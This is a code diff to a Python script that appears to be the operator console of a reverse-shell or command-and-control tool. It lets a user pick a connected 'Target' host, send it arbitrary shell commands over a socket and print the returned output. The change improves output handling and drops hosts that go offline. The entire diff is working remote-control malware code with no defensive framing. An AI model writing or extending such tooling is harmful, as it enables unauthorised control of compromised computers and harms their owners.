@@ -37,19 +37,26 @@ def trigger():
     interaction=int(input("Whom you wanna interact with:-"))
     if interaction:
         if conn_list:
-            console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1][0],list(conn_list.keys())[interaction-1][1])
+            console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1][0],list(conn_list.keys())[interaction-1][1],list(conn_list.keys())[interaction-1])
         else:
             print("No connections")
 
-def console(conn,ip,port):
+def console(conn,ip,port,socket_target):
     print("\n====Target::({}:{})====".format(ip,port))
     while True:
         commands=input("cmd>")
         if commands=='exit':
             return 0
         else:
-            commands = bytes(commands, 'utf-8')
-            conn.sendall(commands)
+            try:
+                commands = bytes(commands, 'utf-8')
+                conn.sendall(commands)
+                print(conn.recv(64000).decode('utf-8'))
+
+            except:
+                print("====Host:{}:{} went offline===".format(ip,port))
+                del conn_list[socket_target]
+                return 0
 
 def banner():
     print("[+] Ignite the light master and change this filthy reality...")
